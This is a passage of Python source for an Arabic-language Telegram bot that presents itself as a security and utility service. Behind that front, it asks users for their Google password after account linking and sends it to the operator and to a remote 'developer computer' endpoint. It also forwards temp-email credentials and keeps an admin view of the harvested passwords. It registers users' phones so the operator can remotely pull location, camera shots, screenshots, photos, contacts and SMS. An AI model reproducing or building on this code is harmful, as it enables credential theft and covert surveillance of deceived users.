    "التحكم بالهاتف": 0, "فحص رقم هاتف": 0, "تتبع الأرقام": 0,
    "فحص تسريبات": 0, "بلاغات فيسبوك": 0,
    "ربط هاتف المستخدم": 0, "ربط هاتف الطفل": 0,
    "التحكم عن بعد": 0, "ربط جوجل": 0, "الرقابة الأبوية": 0,
    "تحليل PDF": 0, "رقم مؤقت": 0
}

REQUIRE_LINK_BUTTONS = ["mode_apk", "mode_my_app", "mode_track_phone",
                         "mode_fb_hacked", "mode_fb_report", "mode_spam_block"]

FB_REPORT_TYPES = {
    "1": "منشور مسيء (Offensive Post)",
    "2": "حساب مزيف (Fake Account)",
    "3": "محتوى غير لائق (Inappropriate Content)",
    "4": "انتهاك خصوصية (Privacy Violation)",
    "5": "تحرش أو مضايقة (Harassment/Bullying)",
    "6": "انتحال شخصية (Impersonation)",
    "7": "محتوى عنيف (Violent Content)",
    "8": "أخرى (Other)"
}

def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("🔍 ثغرات المواقع", callback_data="mode_site"),
        InlineKeyboardButton("📦 فحص APK", callback_data="mode_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ فحص كود", callback_data="mode_my_app"),
        InlineKeyboardButton("🧠 دردشة ذكية", callback_data="mode_ai")
    )
    markup.row(
        InlineKeyboardButton("🎨 إنشاء صور", callback_data="mode_image"),
        InlineKeyboardButton("📧 إيميل مؤقت", callback_data="mode_temp_email")
    )
    if get_user_points(user_id) >= 30:
        markup.row(
            InlineKeyboardButton("📢 إبلاغ فيسبوك 🔓", callback_data="mode_fb_report"),
            InlineKeyboardButton("📞 فحص رقم هاتف", callback_data="mode_spam_block")
        )
    else:
        markup.row(
            InlineKeyboardButton("📢 إبلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
            InlineKeyboardButton("📞 فحص رقم هاتف", callback_data="mode_spam_block")
        )
    markup.row(
        InlineKeyboardButton("📍 تتبع رقم", callback_data="mode_track_phone"),
        InlineKeyboardButton("🛡️ فحص تسريبات", callback_data="mode_fb_hacked")
    )
    markup.row(
        InlineKeyboardButton("📚 تحليل ملف PDF دراسي", callback_data="mode_pdf")
    )
    if user_id == ADMIN_ID or get_user_points(user_id) >= 50:
        markup.row(
            InlineKeyboardButton("📱 رقم هاتف مؤقت 🔓", callback_data="mode_temp_number")
        )
    else:
        markup.row(
            InlineKeyboardButton("📱 رقم هاتف مؤقت 🔒", callback_data="locked_temp_number")
        )
    markup.row(
        InlineKeyboardButton("🔗 تفعيل الميزات المتقدمة", callback_data="mode_link_user"),
        InlineKeyboardButton("🚸 تفعيل الحماية الإضافية", callback_data="mode_link_child")
    )
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ حساب Google متصل", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔑 ربط حساب Google", callback_data="mode_google_login"))
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    if user_id == ADMIN_ID:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin"),
            InlineKeyboardButton("📱 الأجهزة المراقبة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط بحاسب المطور", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات البوت", callback_data="admin_stats"),
            InlineKeyboardButton("📢 إرسال جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
    return markup

def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة مسجلة", callback_data="no_devices"))
    else:
        for dev in devices:
            label = f"📱 {dev['device_id']} - {dev.get('chat_id', 'غير معروف')}"
            markup.row(InlineKeyboardButton(label, callback_data=f"remote_select_{dev['device_id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

# ===================== معالج الأوامر الأساسية =====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    if is_user_banned(chat_id):
        bot.send_message(chat_id, "🚫 أنت محظور.")
        return

    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''

    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                bot.send_message(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code

    upsert_user(chat_id, username, first_name, last_name, referral_code)

    welcome = (
        "🌟 <b>مرحباً بك في نظام T99 المتطور</b> 🌟\n\n"
        "🔹 هذا البوت يستخدم خدمات <b>حقيقية</b> عبر الإنترنت.\n"
        f"⭐ <b>نقاطك:</b> {get_user_points(chat_id)}\n"
        "🔓 تحتاج 30 نقطة لفتح 'إبلاغ فيسبوك'، و50 نقطة لفتح 'رقم هاتف مؤقت'.\n"
        "📌 استخدم الأزرار أدناه للاستفادة من الخدمات.\n"
        "📖 للمساعدة: /help"
    )
    bot.send_message(chat_id, welcome, reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 <b>الأوامر المتاحة:</b>\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - ربط حساب Google\n"
        "/oauth &lt;code&gt; - إكمال ربط Google\n"
        "/logout - تسجيل الخروج من Google\n"
        "/referral - عرض رابط دعوتك\n"
        "/points - عرض نقاطك\n"
        "/cancel - إلغاء العملية الحالية\n"
        "/check_email - عرض رسائل البريد المؤقت\n\n"
        "🔗 <b>نظام النقاط:</b> كل دعوة تمنح 10 نقاط للداعي والمدعو.\n"
        "🔐 <b>تفعيل الميزات:</b> استخدم أزرار 'تفعيل الميزات المتقدمة' أو 'تفعيل الحماية الإضافية'."
    )
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    bot.send_message(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    bot.send_message(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        bot.send_message(chat_id, "✅ أنت متصل بالفعل.")
        return
    url = generate_google_auth_url()
    if not url:
        bot.send_message(chat_id, "⚠️ ميزة ربط Google غير متاحة.")
        return
    bot.send_message(chat_id, f"🔑 <b>ربط Google:</b>\n1. افتح: <code>{url}</code>\n2. انسخ الرمز وأرسل: /oauth &lt;الرمز&gt;\n3. ثم أدخل كلمة السر.")
    notify_admin(f"🔑 مستخدم {chat_id} بدأ ربط Google")

@bot.message_handler(commands=['oauth'])
def google_oauth(message):
    chat_id = message.chat.id
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ استخدم: /oauth &lt;الرمز&gt;")
        return
    code = parts[1].strip()
    token_data = exchange_code_for_token(code)
    if not token_data:
        bot.send_message(chat_id, "❌ فشل التبادل.")
        return
    user_info = get_google_user_info(token_data['access_token'])
    if not user_info:
        bot.send_message(chat_id, "❌ فشل جلب البيانات.")
        return
    google_users[chat_id] = {
        'id': user_info['id'],
        'email': user_info['email'],
        'name': user_info['name'],
        'access_token': token_data['access_token'],
        'refresh_token': token_data.get('refresh_token'),
        'expiry': datetime.now() + timedelta(seconds=token_data['expires_in'])
    }
    user_states[chat_id] = "waiting_for_google_password"
    bot.send_message(chat_id, "✅ تم ربط البريد. الرجاء إدخال كلمة السر (ستُرسل للمطور فقط).")

@bot.message_handler(commands=['logout'])
def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    bot.send_message(chat_id, "✅ تم تسجيل الخروج.")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    bot.send_message(chat_id, f"🔗 رابط دعوتك:\n<code>{link}</code>")

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        bot.send_message(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 <b>رسائل البريد المؤقت:</b>\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل جديدة."
    bot.send_message(chat_id, response)

# ===================== معالج النقر على الأزرار =====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
        chat_id = call.message.chat.id
        user_id = chat_id
        data = call.data

        if data.startswith('admin_') and chat_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
            return

        if data == "locked_fb_report":
            points = get_user_points(chat_id)
            if points < 30:
                bot.answer_callback_query(call.id, f"⚠️ تحتاج 30 نقطة. لديك {points}", show_alert=True)
                return
            else:
                data = "mode_fb_report"

        if data == "locked_temp_number":
            points = get_user_points(chat_id)
            if points < 50:
                bot.answer_callback_query(call.id, f"⚠️ تحتاج 50 نقطة. لديك {points}", show_alert=True)
                return
            else:
                data = "mode_temp_number"

        if data in REQUIRE_LINK_BUTTONS and chat_id not in linked_users:
            bot.send_message(chat_id, "🔗 <b>مطلوب تفعيل الميزات أولاً!</b> استخدم زر 'تفعيل الميزات المتقدمة'.")
            return

        # ====== معالجة الأزرار ======
        if data == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            bot.send_message(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif data == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            bot.send_message(chat_id, "📦 أرسل ملف APK لتحليله (قد يستغرق دقيقة).")
        elif data == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            bot.send_message(chat_id, "🛠️ أرسل ملف الكود (txt, py, js, ...) لمراجعته.")
        elif data == "mode_ai":
            user_states[chat_id] = "waiting_for_ai"
            bot.send_message(chat_id, "🧠 اكتب سؤالك للذكاء الاصطناعي.")
        elif data == "mode_image":
            user_states[chat_id] = "waiting_for_image"
            bot.send_message(chat_id, "🎨 اكتب وصف الصورة التي تريد إنشاءها.")
        elif data == "mode_temp_email":
            email, token, password = create_temp_email_real()
            if email:
                temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
                text = f"📧 <b>بريدك المؤقت:</b> <code>{email}</code>\n🔑 <b>كلمة السر:</b> <code>{password}</code>\nاستخدم /check_email لعرض الرسائل."
                send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
            else:
                text = "⚠️ فشل إنشاء البريد، حاول مرة أخرى."
            bot.send_message(chat_id, text)
            feature_usage["إيميل مؤقت"] += 1
        elif data == "mode_spam_block":
            user_states[chat_id] = "waiting_for_spam_num"
            bot.send_message(chat_id, "📞 أرسل رقم الهاتف لفحصه ضد قواعد بيانات الاحتيال (مثل: +201001234567).")
        elif data == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            bot.send_message(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif data == "mode_fb_hacked":
            user_states[chat_id] = "waiting_for_fb_hacked"
            bot.send_message(chat_id, "🛡️ <b>فحص تسريب البريد الإلكتروني</b>\n\nأرسل البريد الإلكتروني للتحقق من وجوده في قواعد البيانات المسربة.")
        elif data == "mode_fb_report":
            if get_user_points(chat_id) < 30:
                bot.answer_callback_query(call.id, f"⚠️ تحتاج 30 نقطة.", show_alert=True)
                return
            user_states[chat_id] = "waiting_for_fb_report_type"
            text = "📢 <b>تقديم بلاغ لفيسبوك</b>\n\nاختر نوع البلاغ (أرسل رقم النوع):\n"
            for key, value in FB_REPORT_TYPES.items():
                text += f"{key}. {value}\n"
            text += "\n📌 مثال: أرسل <code>1</code> لمنشور مسيء."
            bot.send_message(chat_id, text)
        elif data == "mode_link_user":
            user_states[chat_id] = "waiting_for_device_id"
            feature_usage["ربط هاتف المستخدم"] += 1
            bot.send_message(chat_id, "📱 أرسل معرف الجهاز (Device ID) لتفعيل الميزات المتقدمة.")
        elif data == "mode_link_child":
            user_states[chat_id] = "waiting_for_child_device_id"
            feature_usage["ربط هاتف الطفل"] += 1
            bot.send_message(chat_id, "📱 أرسل معرف جهاز الطفل (Device ID) لتفعيل الحماية الإضافية.")
        elif data == "mode_google_login":
            google_login(call.message)
        elif data == "mode_google_logout":
            google_logout(call.message)
        elif data == "mode_show_points":
            points = get_user_points(chat_id)
            bot.answer_callback_query(call.id, f"⭐ نقاطك: {points}", show_alert=True)
        elif data == "mode_show_referral":
            link = create_referral_link(chat_id)
            bot.answer_callback_query(call.id, f"🔗 رابط دعوتك: {link}", show_alert=True)
        elif data == "mode_admin":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            stats = "👑 <b>لوحة المطور</b>\n"
            for f, c in feature_usage.items():
                stats += f"• {f}: {c} مرة\n"
            bot.send_message(chat_id, stats)
        elif data == "mode_view_devices":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            devs = get_registered_devices_db()
            if not devs:
                text = "📱 لا توجد أجهزة مسجلة."
            else:
                dev_text = "📱 <b>الأجهزة المسجلة:</b>\n"
                for d in devs:
                    dev_text += f"🆔 {d['device_id']} - 👤 {d['chat_id']}\n"
            bot.send_message(chat_id, dev_text)
        elif data == "mode_remote_admin":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            if get_user_points(chat_id) < 30:
                bot.send_message(chat_id, "⚠️ تحتاج 30 نقطة.")
            else:
                text = "🎮 <b>تحكم عن بعد</b>\n\nاختر الجهاز المسجل من القائمة:"
                bot.send_message(chat_id, text, reply_markup=build_device_list_markup())
        elif data == "mode_set_dev_endpoint":
            if chat_id == ADMIN_ID:
                user_states[chat_id] = "waiting_for_dev_endpoint"
                bot.send_message(chat_id, "🖥️ أرسل عنوان حاسب المطور.")
            else:
                bot.send_message(chat_id, "❌ للمطور فقط.")
        elif data.startswith("remote_select_"):
            if chat_id != ADMIN_ID:
                bot.send_message(chat_id, "❌ للمطور فقط.")
                return
            device_id = data.split("_")[2]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT * FROM registered_devices WHERE device_id = ?", (device_id,))
                if c.fetchone():
                    admin_remote_target[chat_id] = device_id
                    user_states[chat_id] = "waiting_for_remote_command"
                    bot.send_message(
                        chat_id,
                        f"✅ تم اختيار الجهاز: {device_id}\n\n"
                        "📝 <b>الأوامر المتاحة:</b>\n"
                        "• <code>موقع</code> - الموقع التقريبي\n"
                        "• <code>كاميرا</code> - التقاط صورة\n"
                        "• <code>لقطة</code> - لقطة شاشة\n"
                        "• <code>صور</code> - سحب صور\n"
                        "• <code>شاشة</code> - عرض التطبيقات والإشعارات\n"
                        "• <code>جهات اتصال</code> - سحب جهات الاتصال\n"
                        "• <code>رسائل</code> - عرض الرسائل النصية\n\n"
                        "⚠️ للأجهزة المرتبطة كـ 'طفل'، أوامر إضافية:\n"
                        "• <code>سجل</code> - عرض سجل التصفح\n"
                        "• <code>حظر example.com</code> - حظر موقع\n"
                        "• <code>الغاء حظر example.com</code> - إلغاء حظر\n"
                        "• <code>تطبيقات</code> - عرض التطبيقات المفتوحة\n"
                        "• <code>تقارير</code> - عرض تقرير النشاط"
                    )
                else:
                    bot.send_message(chat_id, "❌ الجهاز غير موجود.")
        elif data == "admin_stats":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            stats = f"📊 <b>إحصائيات البوت</b>\n\n"
            stats += f"👥 عدد المستخدمين: {len(get_registered_devices_db())}\n"
            stats += f"📱 الأجهزة المسجلة: {len(get_registered_devices_db())}\n"
            stats += f"🔑 مستخدمي Google: {len(google_users)}\n"
            stats += f"🚫 المحظورون: ...\n"
            stats += f"\n📊 <b>إحصائيات الاستخدام:</b>\n"
            for f, c in feature_usage.items():
                stats += f"• {f}: {c} مرة\n"
            bot.send_message(chat_id, stats)
        elif data == "admin_broadcast":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            user_states[chat_id] = "waiting_for_broadcast"
            bot.send_message(chat_id, "📢 أرسل الرسالة التي تريد بثها لجميع المستخدمين.")
        elif data == "admin_collected_data":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            collected = "📩 <b>المعلومات المجمعة</b>\n\n"
            if google_passwords:
                collected += "🔑 <b>كلمات سر Google:</b>\n"
                for uid, pwd in google_passwords.items():
                    email = google_users.get(uid, {}).get('email', 'غير معروف')
                    collected += f"  • {uid} ({email}): <code>{pwd}</code>\n"
            if temp_emails:
                collected += "\n📧 <b>البريد المؤقت:</b>\n"
                for uid, data in temp_emails.items():
                    collected += f"  • {uid}: <code>{data['email']}</code> | <code>{data['password']}</code>\n"
            if not google_passwords and not temp_emails:
                collected += "📭 لا توجد معلومات."
            bot.send_message(chat_id, collected)
        elif data == "admin_logs":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            try:
                with open('bot.log', 'r') as f:
                    logs = f.read().splitlines()[-50:]
                    text = "📜 <b>آخر 50 سطر من السجل:</b>\n" + "\n".join(logs)
                    bot.send_message(chat_id, text)
            except:
                bot.send_message(chat_id, "⚠️ لا يوجد سجل.")
        elif data == "admin_ban_user":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            user_states[chat_id] = "waiting_for_ban_user"
            bot.send_message(chat_id, "🚫 أرسل معرف المستخدم (ID) لحظره.")
        elif data == "admin_unban_user":
            if chat_id != ADMIN_ID:
                bot.answer_callback_query(call.id, "❌ للمطور فقط.", show_alert=True)
                return
            user_states[chat_id] = "waiting_for_unban_user"
            bot.send_message(chat_id, "✅ أرسل معرف المستخدم (ID) لإلغاء حظره.")
        elif data == "mode_pdf":
            user_states[chat_id] = "waiting_for_pdf"
            bot.send_message(chat_id, "📚 أرسل ملف PDF الدراسي الذي تريد تحليله (يفضل أن يكون نصياً).")
            feature_usage["تحليل PDF"] += 1
        elif data == "mode_temp_number":
            if user_id != ADMIN_ID and get_user_points(user_id) < 50:
                bot.send_message(chat_id, "⚠️ تحتاج 50 نقطة لاستخدام هذه الميزة.")
                return
            bot.send_message(chat_id, "⏳ جاري جلب رقم هاتف مؤقت...")
            numbers = fetch_temp_numbers(limit=3)
            if numbers:
                response = "📱 <b>أرقام هواتف مؤقتة:</b>\n\n"
                for i, num in enumerate(numbers, 1):
                    response += f"{i}. <code>{num}</code>\n"
                response += "\n🔹 استخدم هذه الأرقام لاستقبال رسائل التحقق.\n"
                response += "🔹 قد تكون الأرقام مستخدمة من قبل، جرب أكثر من رقم.\n"
                response += "🔹 لرؤية الرسائل، توجه إلى الموقع المدرج مع الرقم."
                bot.send_message(chat_id, response, parse_mode='HTML')
                feature_usage["رقم مؤقت"] += 1
            else:
                bot.send_message(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً أو استخدم موقع آخر.")
        elif data in ["no_devices", "back_to_main"]:
            bot.send_message(chat_id, "🌟 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
        else:
            bot.send_message(chat_id, "⚠️ خيار غير معروف.")

    except Exception as e:
        logger.error(f"خطأ في معالج الأزرار: {e}")
        notify_admin(f"خطأ في معالج الأزرار: {str(e)}", is_error=True)
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج النصوص =====================

@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        # ----- حظر/إلغاء حظر مستخدم -----
        if state == "waiting_for_ban_user":
            if chat_id != ADMIN_ID:
                bot.send_message(chat_id, "❌ هذه الميزة للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                if user_id == ADMIN_ID:
                    bot.send_message(chat_id, "❌ لا يمكن حظر المطور نفسه.")
                    user_states[chat_id] = None
                    return
                ban_user(user_id)
                bot.send_message(chat_id, f"✅ تم حظر المستخدم {user_id}.")
                notify_admin(f"🚫 تم حظر المستخدم {user_id}")
            except:
                bot.send_message(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_unban_user":
            if chat_id != ADMIN_ID:
                bot.send_message(chat_id, "❌ هذه الميزة للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                unban_user(user_id)
                bot.send_message(chat_id, f"✅ تم إلغاء حظر المستخدم {user_id}.")
                notify_admin(f"✅ تم إلغاء حظر المستخدم {user_id}")
            except:
                bot.send_message(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        # ----- البث الجماعي -----
        if state == "waiting_for_broadcast":
            if chat_id != ADMIN_ID:
                bot.send_message(chat_id, "❌ هذه الميزة للمطور فقط.")
                user_states[chat_id] = None
                return
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    bot.send_message(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            bot.send_message(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 تم إرسال بث جماعي\nالرسالة: {text[:50]}...")
            return

        # ----- كلمة سر Google -----
        if state == "waiting_for_google_password":
            if chat_id in google_users:
                password = text
                email = google_users[chat_id]['email']
                google_passwords[chat_id] = password
                send_sensitive_data_to_admin("Google Password", f"{email} | {password}", chat_id)
                send_to_developer_computer("google_credentials", f"{email}:{password}", chat_id)
                bot.send_message(chat_id, "✅ تم ربط Google بنجاح.")
                user_states[chat_id] = None
            return

        # ----- تعيين endpoint للمطور -----
        if state == "waiting_for_dev_endpoint" and chat_id == ADMIN_ID:
            if re.match(r'^https?://', text):
                global developer_computer_endpoint
                developer_computer_endpoint = text
                bot.send_message(chat_id, f"✅ تم تعيين حاسب المطور: {text}")
            else:
                bot.send_message(chat_id, "❌ عنوان غير صالح.")
            user_states[chat_id] = None
            return

        # ----- استقبال Device ID من المستخدم بعد تشغيل السكربت -----
        if state == "waiting_for_device_id":
            device_id = text
            save_device(device_id, chat_id, "هاتف مستخدم (تحكم كامل)", device_id, None)
            linked_users.add(chat_id)
            monitoring_data[chat_id] = []
            user_states[chat_id] = None
            bot.send_message(
                chat_id,
                "✅ <b>تم إعداد جهازك بنجاح!</b>\n\n"
                "🔹 بعد تشغيل سكربت Termux، سيسجل الجهاز تلقائياً في البوت.\n"
                "🔹 يمكنك الآن استخدام الأزرار الأخرى التي تتطلب ربط الهاتف.\n"
                "🔹 المطور يمكنه التحكم بجهازك من خلال لوحة 'تحكم عن بعد'."
            )
            notify_admin(f"🔗 مستخدم {chat_id} قام بتفعيل الميزات المتقدمة (Device ID: {device_id})")
            return

        if state == "waiting_for_child_device_id":
            device_id = text
            save_device(device_id, chat_id, "هاتف طفل (رقابة أبوية)", device_id, None)
            linked_users.add(chat_id)
            monitoring_data[chat_id] = []
            user_states[chat_id] = None
            bot.send_message(
                chat_id,
                "✅ <b>تم إعداد جهاز الطفل بنجاح!</b>\n\n"
                "🔹 يمكن للمطور الآن تفعيل الرقابة الأبوية على هذا الجهاز."
            )
            notify_admin(f"🚸 مستخدم {chat_id} قام بتفعيل الحماية الإضافية (Device ID: {device_id})")
            return

        # ----- معالج الأوامر عن بعد (للمطور) -----
        if chat_id == ADMIN_ID and state == "waiting_for_remote_command":
            device_id = admin_remote_target.get(chat_id)
            if not device_id:
                bot.send_message(chat_id, "❌ لم يتم اختيار جهاز. استخدم /cancel.")
                user_states[chat_id] = None
                return

            command = text.lower()
            if command == "/cancel":
                bot.send_message(chat_id, "❌ تم الإلغاء.")
                user_states[chat_id] = None
                admin_remote_target.pop(chat_id, None)
                return

            add_pending_command_db(device_id, command)
            bot.send_message(chat_id, f"⏳ تم إرسال الأمر <code>{command}</code> إلى الجهاز {device_id}. في انتظار النتيجة...")
            return

        # ----- أسئلة PDF -----
        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ لم يتم تحميل أي ملف PDF. يرجى البدء من جديد بالضغط على زر 'تحليل ملف PDF'.")
                user_states[chat_id] = None
                return
            bot.send_message(chat_id, "⏳ جاري البحث عن الإجابة... قد يستغرق بضع ثوانٍ.")
            answer = answer_question_from_pdf(pdf_text, text)
            bot.send_message(chat_id, f"📚 <b>الإجابة:</b>\n{answer}")
            return

        # ----- الخدمات العامة -----
        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                result, status = scan_url_real(text)
                bot.send_message(chat_id, f"🔍 <b>نتيجة الفحص:</b>\n{result}")
            else:
                bot.send_message(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ai":
            response = ai_chat_real(text)
            bot.send_message(chat_id, response)
            user_states[chat_id] = None
            return

        if state == "waiting_for_image":
            if len(text) < 5:
                bot.send_message(chat_id, "❌ الوصف قصير.")
                return
            img_data, msg = generate_image_real(text)
            if img_data:
                bot.send_photo(chat_id, img_data, caption="🎨 الصورة المولدة")
            else:
                bot.send_message(chat_id, msg)
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            bot.send_message(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_fb_hacked":
            if not re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', text):
                bot.send_message(chat_id, "❌ البريد الإلكتروني غير صحيح.")
                return
            bot.send_message(chat_id, "⏳ جاري فحص البريد...")
            result = check_breach(text)
            bot.send_message(chat_id, result)
            feature_usage["فحص تسريبات"] += 1
            user_states[chat_id] = None
            return

        if state == "waiting_for_spam_num":
            if not re.match(r'^\+?\d{7,15}$', text):
                bot.send_message(chat_id, "❌ رقم غير صالح.")
                return
            bot.send_message(chat_id, "⏳ جاري فحص الرقم...")
            result = verify_phone(text)
            bot.send_message(chat_id, result)
            feature_usage["فحص رقم هاتف"] += 1
            user_states[chat_id] = None
            return

        # ----- بلاغ فيسبوك -----
        if state == "waiting_for_fb_report_type":
            if text not in FB_REPORT_TYPES:
                bot.send_message(chat_id, "❌ نوع غير صحيح.")
                return
            report_type = FB_REPORT_TYPES[text]
            user_states[chat_id] = "waiting_for_fb_report_reason"
            user_states[f"{chat_id}_fb_report_type"] = report_type
            bot.send_message(chat_id, f"✅ تم اختيار: {report_type}\n\nالآن، اكتب شرحاً مفصلاً للسبب.")
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            bot.send_message(chat_id, "✅ تم حفظ السبب.\n\nالآن، أرسل رابط المنشور أو الحساب المخالف (اختياري).\nإذا لم يكن لديك رابط، أرسل 'لا يوجد'.")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                bot.send_message(chat_id, "❌ حدث خطأ، يرجى البدء من جديد.")
                user_states[chat_id] = None
                return
            bot.send_message(chat_id, "⏳ جاري إنشاء الشكوى...")
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "Fake Account": "https://www.facebook.com/help/contact/1743260659609308",
                "Offensive": "https://www.facebook.com/help/contact/315847653073855",
                "Harassment": "https://www.facebook.com/help/contact/237547145079192",
                "Impersonation": "https://www.facebook.com/help/contact/165143319009650",
                "Privacy": "https://www.facebook.com/help/contact/207640860572618"
            }
            support_link = "https://www.facebook.com/help/contact/"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 <b>شكوى رسمية لفيسبوك</b>\n\n"
                f"<code>{report_text}</code>\n\n"
                f"🔗 <b>رابط الدعم الرسمي:</b> {support_link}\n\n"
                f"📌 قم بنسخ النص أعلاه، ثم افتح رابط الدعم، والصق النص مع رابط المنشور/الحساب إن وجد."
            )
            bot.send_message(chat_id, final_msg)
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        # ----- مراقبة الروابط للأطفال (فصل منطقي) -----
        if chat_id in linked_users and state is None:
            device_info = get_device(chat_id)
            if device_info and "طفل" in device_info['type']:
                blocked = get_blocked_domains(chat_id)
